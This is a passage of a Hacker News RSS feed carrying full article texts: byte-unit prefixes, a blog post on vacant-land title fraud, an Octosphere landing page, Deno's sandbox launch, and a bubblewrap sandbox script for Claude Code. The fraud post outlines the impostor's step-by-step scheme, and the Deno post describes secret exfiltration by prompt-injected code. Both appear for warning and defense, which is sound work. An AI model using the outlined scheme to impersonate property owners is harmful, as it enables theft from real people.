        &lt;cell&gt;≈ 12.6%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Exa&lt;/cell&gt;
        &lt;cell&gt;1018&lt;/cell&gt;
        &lt;cell&gt;~ 1.153 * 1018&lt;/cell&gt;
        &lt;cell&gt;≈ 15.3%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Zetta&lt;/cell&gt;
        &lt;cell&gt;1021&lt;/cell&gt;
        &lt;cell&gt;~ 1.181 * 1021&lt;/cell&gt;
        &lt;cell&gt;≈ 18.1%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Yotta&lt;/cell&gt;
        &lt;cell&gt;1024&lt;/cell&gt;
        &lt;cell&gt;~ 1.209 * 1024&lt;/cell&gt;
        &lt;cell&gt;≈ 20.9%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Ronna&lt;/cell&gt;
        &lt;cell&gt;1027&lt;/cell&gt;
        &lt;cell&gt;~ 1.238 * 1027&lt;/cell&gt;
        &lt;cell&gt;≈ 23.8%&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Quetta&lt;/cell&gt;
        &lt;cell&gt;1030&lt;/cell&gt;
        &lt;cell&gt;~ 1.268 * 1030&lt;/cell&gt;
        &lt;cell&gt;≈ 26.8%&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;For 1 quettabyte the inaccuracy is already larger than a quarter. Even for 1 terabyte the difference is noticeable, around 10%. This problem often happens when hardware manufacturers (such as HDD or SSD) advertise the memory capacity in decimal units while the operating system might show in binary units.&lt;/p&gt;
    &lt;p&gt;For smaller amounts of memory the binary representation is pretty close to the decimal one, but diverges for huge amounts of memory.&lt;/p&gt;
    &lt;head rend="h3"&gt;What are the standard units?&lt;/head&gt;
    &lt;p&gt;This "kilobyte = 1024 bytes" rule is actually an old (often confusing) convention. In the tech industry there is still huge inertia, this old convention is still used by RAM manufacturers (JEDEC), tons of software and some operating systems (such as Windows). Interestingly, storage vendors often prefer the decimal convention, which creates even more confusion (mentioned above).&lt;/p&gt;
    &lt;p&gt;In order to solve this confusion, International Electrotechnical Commission introduced binary prefixes for binary units:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Binary units (International Electrotechnical Commission)&lt;/cell&gt;
        &lt;cell role="head"&gt;Decimal units (International System of Units)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;Unit&lt;/cell&gt;
        &lt;cell&gt;Value&lt;/cell&gt;
        &lt;cell&gt;Unit&lt;/cell&gt;
        &lt;cell&gt;Value&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;KiB (kibibyte)&lt;/cell&gt;
        &lt;cell&gt;10241&lt;/cell&gt;
        &lt;cell&gt;kB (kilobyte)&lt;/cell&gt;
        &lt;cell&gt;10001&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;MiB (mebibyte)&lt;/cell&gt;
        &lt;cell&gt;10242&lt;/cell&gt;
        &lt;cell&gt;MB (megabyte)&lt;/cell&gt;
        &lt;cell&gt;10002&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;GiB (gibibyte)&lt;/cell&gt;
        &lt;cell&gt;10243&lt;/cell&gt;
        &lt;cell&gt;GB (gigabyte)&lt;/cell&gt;
        &lt;cell&gt;10003&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;TiB (tebibyte)&lt;/cell&gt;
        &lt;cell&gt;10244&lt;/cell&gt;
        &lt;cell&gt;TB (terabyte)&lt;/cell&gt;
        &lt;cell&gt;10004&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;PiB (pebibyte)&lt;/cell&gt;
        &lt;cell&gt;10245&lt;/cell&gt;
        &lt;cell&gt;PB (petabyte)&lt;/cell&gt;
        &lt;cell&gt;10005&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;EiB (exbibyte)&lt;/cell&gt;
        &lt;cell&gt;10246&lt;/cell&gt;
        &lt;cell&gt;EB (exabyte)&lt;/cell&gt;
        &lt;cell&gt;10006&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;ZiB (zebibyte)&lt;/cell&gt;
        &lt;cell&gt;10247&lt;/cell&gt;
        &lt;cell&gt;ZB (zettabyte)&lt;/cell&gt;
        &lt;cell&gt;10007&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;YiB (yobibyte)&lt;/cell&gt;
        &lt;cell&gt;10248&lt;/cell&gt;
        &lt;cell&gt;YB (yottabyte)&lt;/cell&gt;
        &lt;cell&gt;10008&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;RiB (robibyte)&lt;/cell&gt;
        &lt;cell&gt;10249&lt;/cell&gt;
        &lt;cell&gt;RB (ronnabyte)&lt;/cell&gt;
        &lt;cell&gt;10009&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;QiB (quebibyte)&lt;/cell&gt;
        &lt;cell&gt;102410&lt;/cell&gt;
        &lt;cell&gt;QB (quettabyte)&lt;/cell&gt;
        &lt;cell&gt;100010&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The guidance is: SI prefixes are powers of 10 only, and if you mean powers of 2 you should use IEC binary prefixes (Ki, Mi, Gi, …).&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;There is still a lot of inertia to equate 1 kilobyte to 1024 bytes. While this is usually acceptable depending on the context, it can sometimes cause confusion, especially for non-technical people.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46873539</guid><pubDate>Tue, 03 Feb 2026 16:53:50 +0000</pubDate></item><item><title>221 Cannon is Not For Sale</title><link>https://fredbenenson.com/blog/2026/02/03/221-cannon-is-not-for-sale/</link><description>&lt;doc fingerprint="ec0da09223e19cd5"&gt;
  &lt;main&gt;
    &lt;p&gt;Like most people, I’ve had my identity stolen once or twice in my life. It’s annoying, but thankfully I’ve avoided some of the more catastrophic outcomes when criminals begin impersonating you.&lt;/p&gt;
    &lt;p&gt;These days, however, it seems like someone is really trying to change that: a scammer has now tried to impersonate me multiple times in a six figure land deal in my hometown of Wilton, CT. So while I usually use this blog to write about finding weird things on the internet, it’s now time for a story about something weird on the internet finding me.&lt;/p&gt;
    &lt;p&gt;The story begins with my brother Alexander and I purchasing a small parcel of vacant land at 221 Cannon Road in Wilton, Connecticut in 2015. It’s been over 10 years since we purchased it and we have never listed it for sale. Nor do we have plans to sell it.&lt;/p&gt;
    &lt;p&gt;And yet, three different real estate agents have now contacted us to let us know that someone has been impersonating us and attempting to sell our property out from under us.&lt;/p&gt;
    &lt;p&gt;The first time it happened, it was pretty upsetting, but now that it’s happened another two times, I figured it was time to write a blog post about it.&lt;/p&gt;
    &lt;head rend="h2"&gt;The First Attempt (March 2024)&lt;/head&gt;
    &lt;p&gt;In March 2024, I received an email from a real estate attorney in Wilton, asking if I was the “Fred Benenson” who co-owned property in town with an “Ed Benenson.” He explained that a realtor at a major brokerage had been working with someone claiming to be us, and that there was already an offer on the table. The attorney was doing his due diligence before representing the sellers — and something didn’t add up.&lt;/p&gt;
    &lt;p&gt;I replied within minutes: Neither of us had spoken to anyone about selling the property. It was pretty concerning.&lt;/p&gt;
    &lt;p&gt;The realtor had been contacted through Zillow by someone claiming to be me. They’d had a phone conversation — she noted the person had a “middle European” accent — and the scammer had provided accurate details about the property, including its exact acreage. The impostor gave her the email address &lt;code&gt;[email protected]&lt;/code&gt; and the phone number (516) 828-0305. He also provided a fake email for my brother: &lt;code&gt;[email protected]&lt;/code&gt;. Notice the subtle misspelling — “Benenson” without the second “n” in the email, and the hyphenated “out-look.com” domain.&lt;/p&gt;
    &lt;p&gt;She had walked the property, taken drone photos, pulled comps, and listed for a price well above what we paid for it. The property had been live on dozens of real estate websites for days before anyone caught it. A builder had already submitted a full-price cash offer.&lt;/p&gt;
    &lt;p&gt;The scammer had even e-signed a purchase agreement.&lt;/p&gt;
    &lt;p&gt;When the attorney requested identification before closing, the impostor provided a New York State driver’s license. It had my father’s name (which I share with him) and his correct date of birth and home address. But the photo was of a complete stranger.&lt;/p&gt;
    &lt;p&gt;I have no idea who that guy is in on the license, but it’s definitely not my Dad. The license wouldn’t fool anyone who knew my father, but it didn’t need to – in a transaction conducted entirely by email and text message, with a closing that the scammer would never actually attend, the ID just needed to look plausible enough to keep things moving forward. (Though if you look closely at his signature, it’s clearly not written by hand.)&lt;/p&gt;
    &lt;head rend="h2"&gt;How It Was Caught&lt;/head&gt;
    &lt;p&gt;The attorney deserves most of the credit here. He told me this was the second time in nine months he’d encountered this exact scheme on vacant land in Wilton – his policy is that he won’t represent owners of vacant land without independently verifying ownership. That’s what led him to track me down, and that’s what stopped the sale.&lt;/p&gt;
    &lt;p&gt;The realtor was an innocent victim in this too. She’d done her job by walking the property, pulling comps, etc., all in good faith. When I initially suggested (perhaps unfairly) that this felt like lead generation, the attorney took me aside and vouched for her. I’m glad I listened to him!&lt;/p&gt;
    &lt;p&gt;I apologized to her, and she graciously forwarded me all of her text message exchanges with the scammer. Reading through them was fascinating. The impostor was responsive, polite, and generally knew the right things to say. But there were tells: slightly awkward phrasing (“Hi good morning”), declining a for-sale sign (“No I don’t think that will be necessary”), and a general reluctance to engage in any way that might require showing up in person.&lt;/p&gt;
    &lt;head rend="h2"&gt;Going to the FBI&lt;/head&gt;
    &lt;p&gt;After gathering everything I could — the fake ID, the realtor’s text messages, the scammer’s email addresses and phone number, and the attorney’s notes from a prior similar case — I contacted the FBI field office in Connecticut. They directed me to “walk it in” to the office in New York City.&lt;/p&gt;
    &lt;p&gt;The experience was, frankly, underwhelming. The FBI wouldn’t let me submit any of our documentation. Instead, they required me to write out the entire complaint by hand on a single piece of paper and hand it to the guard. He made some calls while I waited, and by the end he seemed at least somewhat interested. He gave me the standard line: 2-3 weeks if I hear from anyone.&lt;/p&gt;
    &lt;p&gt;I never heard from anyone.&lt;/p&gt;
    &lt;p&gt;The attorney, meanwhile, checked with his title company about recording an affidavit on the land records — something that would alert any future buyer or title searcher that the property had been targeted by fraud, and providing our verified contact information.&lt;/p&gt;
    &lt;head rend="h2"&gt;It’s Happening Again (February 2026)&lt;/head&gt;
    &lt;p&gt;I thought this was behind us. Then, this past week, nearly two years later, I was contacted by two more real estate agents, both reaching out to warn me that someone was once again trying to sell 221 Cannon Road.&lt;/p&gt;
    &lt;p&gt;The first was a agent in Wilton who reached out via Instagram DM, of all places — it was the only way he could find to contact me. He explained that his team had received an inquiry to list 221 Cannon Road and had sent paperwork to “Fred and Alex” the night before to sign. But he’d done something smart: he’d noticed he had a mutual friend with my brother, and when he asked him about the situation, he flagged that the conversation with “Alex” didn’t sound right.&lt;/p&gt;
    &lt;p&gt;“I had a really bad feeling it wasn’t,” he told me.&lt;/p&gt;
    &lt;p&gt;The second agent, a woman at Berkshire Hathaway, sent a carefully worded email explaining that she’d been contacted by someone claiming to have authority to sell our property, but that “several standard verification steps raised concerns” and she chose not to proceed. She reached out purely as a courtesy to let us know.&lt;/p&gt;
    &lt;p&gt;Which is about when I decided I should write something about this. Not only because it’s a fascinating scam that seems to be getting more common, but because I figured this post might show up for the next broker who might be doing research on the address.&lt;/p&gt;
    &lt;head rend="h2"&gt;Vacant Land Fraud&lt;/head&gt;
    &lt;p&gt;This type of scam targets a very specific vulnerability: vacant land has no occupants to notice a for-sale sign, no neighbors who’d immediately recognize something is wrong, and closings often happen remotely.&lt;/p&gt;
    &lt;p&gt;Here’s how it works:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The scammer identifies vacant land through public records or Zillow. They look for parcels that are owned free and clear (no mortgage), haven’t changed hands recently, and are in desirable areas.&lt;/item&gt;
      &lt;item&gt;They contact a real estate agent through a platform like Zillow, posing as the owner. They know the property details because that information is publicly available.&lt;/item&gt;
      &lt;item&gt;They communicate primarily through text and email, avoiding in-person meetings. They provide fake identification if asked.&lt;/item&gt;
      &lt;item&gt;They agree to whatever price the agent suggests (because they don’t actually own the property, any sale is pure profit).&lt;/item&gt;
      &lt;item&gt;They push for a quick closing and attempt to direct proceeds to an account they control.&lt;/item&gt;
      &lt;item&gt;If questioned, they disappear. The scammer who targeted us in 2024 simply stopped responding once the attorney asked for an in-person closing.&lt;/item&gt;
      &lt;item&gt;If they get farther they’ll pocket the earnest money deposit which would have been significant in my case.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;A similar scheme in nearby Fairfield wasn’t caught in time: someone had a $1.5 million home built on land they didn’t own without the actual owners knowing.&lt;/p&gt;
    &lt;head rend="h2"&gt;What You Can Do&lt;/head&gt;
    &lt;p&gt;If you own vacant land there are a couple of things you can do, but the most effective one is probably to register the address with a Fraud / No-Authority notice. This involves calling the County Recorder / Register of Deeds and ask how to record one of these (names vary by state):&lt;lb/&gt; • Owner Affidavit&lt;lb/&gt; • Affidavit of Fact&lt;lb/&gt; • Notice of Non-Authority to Convey&lt;lb/&gt; • Fraud Alert / Title Alert Notice&lt;lb/&gt; • Statement of Ownership / Anti-Fraud Notice:&lt;/p&gt;
    &lt;p&gt;You could also setup up Google Alerts for your address and you’ll be notified if it appears online.&lt;/p&gt;
    &lt;p&gt;Finally, and this certainly isn’t for everyone, you can make yourself easily findable online. One reason the attorney was able to verify ownership quickly in 2024 was that it’s fairly easy to gooogle me. If you own property, make sure there’s some way for a diligent attorney or agent to reach the real you.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Property Is Not For Sale&lt;/head&gt;
    &lt;p&gt;In case it isn’t clear, 221 Cannon Road is not for sale. It has never been for sale. If you are a real estate professional who has been contacted about listing or purchasing this property, please reach out to me directly.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46873574</guid><pubDate>Tue, 03 Feb 2026 16:56:06 +0000</pubDate></item><item><title>Show HN: Octosphere, a tool to decentralise scientific publishing</title><link>https://octosphere.social/</link><description>&lt;doc fingerprint="f9dc5bdd087c8698"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Octosphere&lt;/head&gt;
    &lt;p&gt;Connecting open science with the social web&lt;/p&gt;
    &lt;head rend="h2"&gt;What is Octosphere?&lt;/head&gt;
    &lt;p&gt;Octosphere bridges the gap between academic publishing and the social web. It automatically syncs your research publications from Octopus to the AT Protocol (the atmosphere) — an open, decentralized network for social apps like Bluesky.&lt;/p&gt;
    &lt;p&gt;By sharing your work on the atmosphere, you can reach broader audiences, engage with the public, and increase the visibility of your research beyond traditional academic channels.&lt;/p&gt;
    &lt;head rend="h2"&gt;How it works&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Sign in with ORCID — Authenticate using your researcher identifier.&lt;/item&gt;
      &lt;item&gt;Connect to the atmosphere — Sign in with your Bluesky account (or any AT Protocol app).&lt;/item&gt;
      &lt;item&gt;Link your Octopus profile — Connect your Octopus author page.&lt;/item&gt;
      &lt;item&gt;Sync your publications — Choose one-time sync or enable automatic syncing of future publications.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46873782</guid><pubDate>Tue, 03 Feb 2026 17:11:42 +0000</pubDate></item><item><title>Deno Sandbox</title><link>https://deno.com/blog/introducing-deno-sandbox</link><description>&lt;doc fingerprint="84be1f18cd2fafa2"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing Deno Sandbox&lt;/head&gt;
    &lt;p&gt;Over the past year, we’ve seen a shift in what Deno Deploy customers are building: platforms where users generate code with LLMs, and that code runs immediately without review. That code frequently calls LLMs itself, which means it needs API keys and network access.&lt;/p&gt;
    &lt;p&gt;This isn’t the traditional “run untrusted plugins” problem. It’s deeper: LLM-generated code, calling external APIs with real credentials, without human review. Sandboxing the compute isn’t enough. You need to control network egress and protect secrets from exfiltration.&lt;/p&gt;
    &lt;p&gt;Deno Sandbox provides both. And when the code is ready, you can deploy it directly to Deno Deploy without rebuilding.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sandboxes?&lt;/head&gt;
    &lt;p&gt;You don’t want to run untrusted code (generated by your LLMs, your users LLMs, or even hand written by users) directly on your server. It will compromise your system, steal your API keys, and call out to evil.com. You need isolation.&lt;/p&gt;
    &lt;p&gt;Deno Sandbox gives you lightweight Linux microVMs (running in the Deno Deploy cloud) to run untrusted code with defense-in-depth security. You create or programmatically via our JavaScript or Python SDKs, and they boot in under a second. You can also interact with them via SSH, HTTP, or even open a VS Code window directly into the sandbox.&lt;/p&gt;
    &lt;code&gt;import { Sandbox } from "@deno/sandbox";

await using sandbox = await Sandbox.create();
await sandbox.sh`ls -lh /`;&lt;/code&gt;
    &lt;head rend="h2"&gt;Secrets That Can’t Be Stolen&lt;/head&gt;
    &lt;p&gt;But there is more. In Deno Sandbox, secrets never enter the environment. Code sees only a placeholder:&lt;/p&gt;
    &lt;code&gt;import { Sandbox } from "@deno/sandbox";

await using sandbox = await Sandbox.create({
  secrets: {
    OPENAI_API_KEY: {
      hosts: ["api.openai.com"],
      value: process.env.OPENAI_API_KEY,
    },
  },
});

await sandbox.sh`echo $OPENAI_API_KEY`;
// DENO_SECRET_PLACEHOLDER_b14043a2f578cba75ebe04791e8e2c7d4002fd0c1f825e19...&lt;/code&gt;
    &lt;p&gt;The real key materializes only when the sandbox makes an outbound request to an approved host. If prompt-injected code tries to exfiltrate that placeholder to &lt;code&gt;evil.com&lt;/code&gt;? Useless.&lt;/p&gt;
    &lt;head rend="h2"&gt;Network Egress Control&lt;/head&gt;
    &lt;p&gt;You can also restrict which hosts the sandbox can talk to:&lt;/p&gt;
    &lt;code&gt;await using sandbox = await Sandbox.create({
  allowNet: ["api.openai.com", "*.anthropic.com"],
});&lt;/code&gt;
    &lt;p&gt;Any request to an unlisted host gets blocked at the VM boundary.&lt;/p&gt;
    &lt;p&gt;Both features are implemented via an outbound proxy similar to coder/httpjail. This gives us a chokepoint for policy enforcement. We plan to add more capabilities here: analytics for outbound connections and programmatic hooks for trusted code to inspect or modify requests.&lt;/p&gt;
    &lt;p&gt;If you’re running untrusted JavaScript or TypeScript, combine this with Deno’s &lt;code&gt;--allow-net&lt;/code&gt; flag for defense in depth: VM-level network restrictions plus
runtime-level permissions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Sandbox to Production&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;sandbox.deploy()&lt;/code&gt; deploys code from your sandbox directly to Deno Deploy.&lt;/p&gt;
    &lt;code&gt;const build = await sandbox.deploy("my-app", {
  production: true,
  build: { mode: "none", entrypoint: "server.ts" },
});

const revision = await build.done;
console.log(revision.url);&lt;/code&gt;
    &lt;p&gt;One call to go from sandbox to production deployment. No rebuilding in a different CI system, no re-authenticating with a different tool. Just turn your dev environment directly into a production ready, auto-scaling serverless deployment.&lt;/p&gt;
    &lt;head rend="h2"&gt;Persistence&lt;/head&gt;
    &lt;p&gt;Sandboxes are ephemeral by default, but when you need state we have you covered:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Volumes: read-write storage for caches, databases, user data&lt;/item&gt;
      &lt;item&gt;Snapshots: read-only images for pre-installed toolchains and volume base&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Run &lt;code&gt;apt-get install&lt;/code&gt; once, snapshot it, and every future sandbox boots with
everything already installed. Create read-write volumes from the snapshots to
create a fresh development environment in seconds.&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical Details&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Spec&lt;/cell&gt;
        &lt;cell role="head"&gt;Value&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Regions&lt;/cell&gt;
        &lt;cell&gt;Amsterdam, Chicago&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;vCPUs&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Memory&lt;/cell&gt;
        &lt;cell&gt;768 MB - 4 GB&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Lifetime&lt;/cell&gt;
        &lt;cell&gt;Ephemeral or timeout (supports extending on demand)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;Max lifetime&lt;/cell&gt;
        &lt;cell&gt;30 minutes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Boot time&lt;/cell&gt;
        &lt;cell&gt;&amp;lt; 1 second&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Perfect for AI agents executing code, vibe-coding environments, secure plugin systems, ephemeral CI runners, and customer-supplied code.&lt;/p&gt;
    &lt;head rend="h2"&gt;Pricing&lt;/head&gt;
    &lt;p&gt;Deno Sandbox is included in your Deno Deploy plan with competitive, usage-based pricing. You pay for compute time, not wall-clock time.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;$0.05/h CPU time (40h included with Pro)&lt;/item&gt;
      &lt;item&gt;$0.016/GB-h memory (1000 GB-h included with Pro)&lt;/item&gt;
      &lt;item&gt;$0.20/GiB-month volume storage (5 GiB included with Pro)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Enterprise pricing available—contact deploy@deno.com.&lt;/p&gt;
    &lt;head rend="h2"&gt;Get Started&lt;/head&gt;
    &lt;p&gt;Deno Sandbox launches in beta today, alongside the general availability of Deno Deploy.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Landing page: deno.com/sandbox&lt;/item&gt;
      &lt;item&gt;Docs: docs.deno.com/sandbox&lt;/item&gt;
      &lt;item&gt;JavaScript SDK: jsr.io/@deno/sandbox or npm&lt;/item&gt;
      &lt;item&gt;Python SDK: pypi.org/project/deno-sandbox&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We’re excited to see what you (or your AI agents) build with Deno Sandbox.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46874097</guid><pubDate>Tue, 03 Feb 2026 17:33:20 +0000</pubDate></item><item><title>Sandboxing AI Agents in Linux</title><link>https://blog.senko.net/sandboxing-ai-agents-in-linux</link><description>&lt;doc fingerprint="7d9ab85b0e859780"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Sandboxing AI agents in Linux&lt;/head&gt;
    &lt;p&gt;Like many developers, I find myself more and more using AI agents to help with software development.&lt;/p&gt;
    &lt;p&gt;I currently use Claude Code, the command line interface, together with Opus 4.5 (Anthropic's top model as of this writing). I use it to distill my rough task requirements into a detailed development plan, then implement the plan.&lt;/p&gt;
    &lt;p&gt;By default, Claude Code asks each time if it may read and write files and run software. This is sensible default configuration, but does get annoying after a time. Worse, it interrupts me often enough that I can't do much in parallel while babysitting it.&lt;/p&gt;
    &lt;p&gt;There's also a &lt;code&gt;--dangerously-skip-permissions&lt;/code&gt; (a.k.a. “YOLO”) mode which will happily run anything without asking. This can be risky (although I know of some people that run it like that and still haven't destroyed their dev machines).&lt;/p&gt;
    &lt;head rend="h2"&gt;Sandboxing&lt;/head&gt;
    &lt;p&gt;The standard solution is to sandbox the agent – either on a remote machine (exe.dev, sprites.dev, daytona.io), or locally via Docker or other virtualization mechanism.&lt;/p&gt;
    &lt;p&gt;A lightweight alternative on Linux is bubblewrap, which uses Linux kernel features like cgroups and user namespaces to limit (jail) a process.&lt;/p&gt;
    &lt;p&gt;As it turns out, bubblewrap is a good solution for lightweight sandboxing of AI agents. Here's what I personally need from such a solution:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;mimic my regular Linux dev machine setup (I don't want to manage multiple dev environment)&lt;/item&gt;
      &lt;item&gt;minimal/no access to information outside what's required for the current project&lt;/item&gt;
      &lt;item&gt;write access only to the current project&lt;/item&gt;
      &lt;item&gt;can directly operate on the files/folders of the project so I can easily inspect or modify the same files from my IDE or run the code myself&lt;/item&gt;
      &lt;item&gt;network access – both to connect to AI providers and search the internet, and to be able to start a server that I can connect to&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Bubblewrap and Docker are not hardened security isolation mechanisms, but that's okay with me. I'm not really concerned about the following risks:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;escape via zero-day Linux kernel bug&lt;/item&gt;
      &lt;item&gt;covert side channel communications&lt;/item&gt;
      &lt;item&gt;exfiltration of data from current project (including project-specific access keys)&lt;/item&gt;
      &lt;item&gt;screwing up the codebase (the code is managed via &lt;code&gt;git&lt;/code&gt;and backed up at GitHub or elsewhere)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The last bit is tricky, but even full remote sandboxes can't protect against that. In theory, we could have transparent API proxies that would inject proper access keys without the AI agent ever being aware of it, but this is really non-trivial to set up right now.&lt;/p&gt;
    &lt;p&gt;An alternative is to contain potential damage by creating project-specific API keys so at least the blast area is minimal if those keys are leaked.&lt;/p&gt;
    &lt;head rend="h2"&gt;In practice&lt;/head&gt;
    &lt;p&gt;Here's how my bubblewrap sandbox script looks:&lt;/p&gt;
    &lt;code&gt;#!/usr/bin/bash

exec 3&amp;lt;$HOME/.claude.json

exec /usr/bin/bwrap \
    --tmpfs /tmp \
    --dev /dev \
    --proc /proc \
    --hostname bubblewrap --unshare-uts \
    --ro-bind /bin /bin \
    --ro-bind /lib /lib \
    --ro-bind /lib32 /lib32 \
    --ro-bind /lib64 /lib64 \
    --ro-bind /usr/bin /usr/bin \
    --ro-bind /usr/lib /usr/lib \
    --ro-bind /usr/local/bin /usr/local/bin \
    --ro-bind /usr/local/lib /usr/local/lib \
    --ro-bind /opt/node/node-v22.11.0-linux-x64/ /opt/node/node-v22.11.0-linux-x64/ \
    --ro-bind /etc/alternatives /etc/alternatives \
    --ro-bind /etc/resolv.conf /etc/resolv.conf \
    --ro-bind /etc/profile.d /etc/profile.d \
    --ro-bind /etc/bash_completion.d /etc/bash_completion.d \
    --ro-bind /etc/ssl/certs /etc/ssl/certs \
    --ro-bind /etc/ld.so.cache /etc/ld.so.cache \
    --ro-bind /etc/ld.so.conf /etc/ld.so.conf \
    --ro-bind /etc/ld.so.conf.d /etc/ld.so.conf.d \
    --ro-bind /etc/localtime /etc/localtime \
    --ro-bind /usr/share/terminfo /usr/share/terminfo \
    --ro-bind /usr/share/ca-certificates /usr/share/ca-certificates \
    --ro-bind /etc/nsswitch.conf /etc/nsswitch.conf \
    --ro-bind /etc/hosts /etc/hosts \
    --ro-bind /etc/ssl/openssl.cnf /etc/ssl/openssl.cnf \
    --ro-bind /usr/share/zoneinfo /usr/share/zoneinfo \
    --ro-bind $HOME/.bashrc $HOME/.bashrc \
    --ro-bind $HOME/.profile $HOME/.profile \
    --ro-bind $HOME/.gitconfig $HOME/.gitconfig \
    --ro-bind $HOME/.local $HOME/.local \
    --bind $HOME/.claude $HOME/.claude \
    --bind $HOME/.cache $HOME/.cache \
    --file 3 $HOME/.claude.json \
    --bind "$PWD" "$PWD" \
    claude --dangerously-skip-permissions $@
&lt;/code&gt;
    &lt;p&gt;If this looks rather idiosyncratic, it's because it is. Rather than using some generic rules, I experimented with &lt;code&gt;bwrap&lt;/code&gt; until I found minimal configuration that I need to set up for my system.&lt;/p&gt;
    &lt;p&gt;Some interesting stuff:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/tmp&lt;/code&gt;,&lt;code&gt;/proc&lt;/code&gt;and&lt;code&gt;/dev&lt;/code&gt;are automatically handled by&lt;code&gt;bwrap&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;I bind-mount (ie. expose) files and directories under the same path as local machine, so there's no difference in file locations, project paths, etc&lt;/item&gt;
      &lt;item&gt;I don't expose entire &lt;code&gt;/etc&lt;/code&gt;, just the bare minimum&lt;/item&gt;
      &lt;item&gt;The content of &lt;code&gt;$HOME/.claude.json&lt;/code&gt;is injected into the sandbox so any changes there won't get saved to the real one&lt;/item&gt;
      &lt;item&gt;The content of &lt;code&gt;$HOME/.claude/&lt;/code&gt;directory is mapped read-write, so Claude can save and modify files there (such as session data)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;/opt/node/node-v22.11.0-linux-x64/&lt;/code&gt;is my custom&lt;code&gt;nodejs&lt;/code&gt;install location&lt;/item&gt;
      &lt;item&gt;I change the hostname so it's easy to distinguish between the host and sandbox&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I will probably be tweaking the script as needed, but this is a pretty good starting point for me.&lt;/p&gt;
    &lt;head rend="h2"&gt;How to customize&lt;/head&gt;
    &lt;p&gt;If you want to adapt this to another AI agent or to your system, my suggestion is to tweak the script to run &lt;code&gt;bash&lt;/code&gt; instead, then run your agent manually, see what breaks and tweak as appropriate.&lt;/p&gt;
